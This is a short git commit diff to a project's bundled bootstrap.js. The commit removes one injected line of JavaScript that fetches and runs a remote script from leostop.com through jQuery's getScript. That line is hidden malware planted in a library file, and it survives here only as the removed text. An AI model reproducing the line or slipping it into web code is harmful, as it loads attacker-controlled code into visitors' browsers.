416bf67b607aa6287fa785fa6ce950f048b090ab
Ramazan Ozer <ozerramazan991@gmail.com>
2024-04-30 22:16:17 +0300

    new update on bootstrap.js

--- src/main/resources/static/js/bootstrap.js
+++ src/main/resources/static/js/bootstrap.js
@@ -224,9 +224,6 @@
   };
   setTransitionEndSupport();
 
-
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
-
   /**
    * ------------------------------------------------------------------------
    * Constants
